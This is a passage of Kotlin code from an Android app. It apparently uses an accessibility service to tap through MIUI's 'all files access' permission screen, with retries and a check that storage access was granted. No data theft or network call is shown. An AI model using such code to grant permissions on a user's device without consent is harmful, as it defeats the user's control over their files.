                    logs.add("MIUI ALL_FILES: L3 坐标点 ($coordX,$coordY) dur=${ALL_FILES_COORD_DURATION_MS}ms")
                }
            }

            // L4 验证
            for (v in 0 until ALL_FILES_VERIFY_ROUNDS) {
                kotlinx.coroutines.delay(ALL_FILES_VERIFY_DELAY_MS)
                if (android.os.Environment.isExternalStorageManager()) {
                    successes.add("all_files_access")
                    logs.add("MIUI ALL_FILES: ✅ 授权成功 (外层 ${attempt + 1})")
                    return true
                }
            }

            // 回收本轮 root 节点（API<33 需要）
            try { root.recycle() } catch (_: Throwable) {}
        }

        failures.add("all_files_access")
        logs.add("MIUI ALL_FILES: ❌ 3 轮重试仍失败")
        return false
    }
}
